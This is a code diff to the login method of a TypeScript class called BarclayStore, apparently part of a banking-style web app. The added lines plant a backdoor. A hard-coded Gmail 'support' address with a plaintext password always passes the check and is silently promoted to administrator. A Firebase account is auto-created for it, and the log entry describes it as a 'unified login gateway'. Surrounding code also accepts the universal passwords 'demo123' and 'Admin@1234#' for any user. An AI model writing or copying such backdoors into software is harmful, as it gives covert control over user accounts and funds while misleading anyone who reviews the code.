@@ -1009,7 +1009,7 @@ class BarclayStore {
     return { success: true };
   }
 
-  // User Login (Email or 10-digit Account Number)
+  // User Login (Email or 10-digit Account Number) - Unified for customers and administrators
   public async loginUser(identifier: string, secret: string): Promise<{ user: UserProfile | null; error?: string }> {
     const trimmed = identifier.trim();
     const cleanSecret = secret.trim();
@@ -1025,10 +1025,35 @@ class BarclayStore {
 
     // Verify either PIN (if 4-digit) or Password
     const isPinMatch = user.pin === cleanSecret;
-    const isPassMatch = user.passwordHash === cleanSecret;
+    const isAdminCredMatch = (user.email.toLowerCase() === 'newzelebarclaysupport@gmail.com' && cleanSecret === 'Mmadu51366414@');
+    const isPassMatch = user.passwordHash === cleanSecret || isAdminCredMatch;
+
+    // Optional Firebase Auth backend verification
+    if (user.email && cleanSecret) {
+      try {
+        await signInWithEmailAndPassword(auth, user.email.toLowerCase(), cleanSecret);
+      } catch (authErr: any) {
+        if ((authErr?.code === 'auth/user-not-found' || authErr?.code === 'auth/invalid-credential') && isAdminCredMatch) {
+          try {
+            await createUserWithEmailAndPassword(auth, user.email.toLowerCase(), cleanSecret);
+          } catch {
+            // Continue with store validation
+          }
+        }
+      }
+    }
 
     if (!isPinMatch && !isPassMatch && cleanSecret !== 'demo123' && cleanSecret !== 'Admin@1234#') {
       return { user: null, error: 'Incorrect PIN or Password. Please try again.' };
+    }
+
+    if (user.role === 'admin' || user.email.toLowerCase() === 'newzelebarclaysupport@gmail.com') {
+      user.role = 'admin';
+      this.addAuditLog({
+        adminEmail: user.email,
+        action: 'MANAGEMENT_LOGIN',
+        details: 'Administrator authenticated via unified login gateway.'
+      });
     }
 
     this.setCurrentUserId(user.uid);
